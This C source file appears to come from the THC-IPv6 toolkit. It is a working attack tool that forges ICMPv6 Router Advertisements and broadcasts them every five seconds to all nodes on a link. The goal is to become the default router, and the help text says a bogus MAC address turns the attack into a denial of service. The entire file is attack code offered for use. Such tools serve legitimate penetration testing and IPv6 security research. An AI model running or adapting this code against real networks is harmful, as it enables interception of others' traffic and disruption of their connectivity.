#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

void help(char *prg) {
  printf("%s %s (c) 2006 by %s %s\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-r] interface router-ip-link-local network-address/prefix-length mtu [mac-address]\n", prg);
  printf("Announce yourself as a router and try to become the default router.\n");
  printf("If a non-existing mac-address is supplied, this results in a DOS.\n");
  printf("Use -r to use raw mode.\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *routerip, *interface, mac[6] = "";
  unsigned char *routerip6, *route6, *mac6 = mac, *ip6;
  unsigned char buf[56], *ptr;
  unsigned char *dst = thc_resolve6("FF02::1"), *dstmac = thc_get_multicast_mac(dst);
  int size, mtu, i, j, k;
  unsigned char *pkt = NULL;
  int pkt_len = 0;
  int rawmode = 0;
  
  if (argc < 5 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  memset(mac, 0, sizeof(mac));
  interface = argv[1];
  mtu = atoi(argv[4]);
  if ((ptr = argv[5]) != NULL)
    sscanf(ptr, "%x:%x:%x:%x:%x:%x", (unsigned int*)&mac[0], (unsigned int*)&mac[1], (unsigned int*)&mac[2], (unsigned int*)&mac[3], (unsigned int*)&mac[4], (unsigned int*)&mac[5]);
  else
    mac6 = thc_get_own_mac(interface);

  if (mac6 == NULL) {
    printf("Error: Mac address in invalid\n");
    exit(-1);
  }

  ip6 = thc_resolve6(argv[2]);
  routerip = argv[3];
  if ((ptr = index(routerip, '/')) == NULL) {
    printf("Error: Option must be supplied as IP-ADRESS/PREFIXLENGTH, e.g. ff80::01/16\n");
  }
  *ptr++ = 0;
  size = atoi(ptr);
  
  routerip6 = thc_resolve6(routerip);
  route6 = thc_resolve6(routerip);
  i = 128 - size;
  j = i / 8;
  k = i % 8;
  if (k > 0)
    j++;
  memset(route6 + 16 - j, 0, j);
  if (k > 0)
    route6[17 - j] = (route6[17 - j] >> (8 - k)) << (8 - k);

  memset(buf, 0, sizeof(buf));
  buf[1] = 250;
  buf[5] = 30;
  buf[8] = 5;
  buf[9] = 1;
  buf[12] = mtu / 16777216;
  buf[13] = (mtu % 16777216) / 65536;
  buf[14] = (mtu % 65536) / 256;
  buf[15] = mtu % 256;
  buf[16] = 3;
  buf[17] = 4;
  buf[18] = size;
  buf[19] = 128 + 64;
  memset(&buf[20], 255, 8);
  memcpy(&buf[32], route6, 16);
  buf[48] = 1;
  buf[49] = 1;
  memcpy(&buf[50], mac6, 6);

  if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff08ffff, buf, sizeof(buf), 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0)
    return -1;

  printf("Starting to advertise router %s (Press Control-C to end) ...\n", argv[2]);
  while (1) {
    thc_send_pkt(interface, pkt, &pkt_len);
    sleep(5);
  }
  return 0;
}
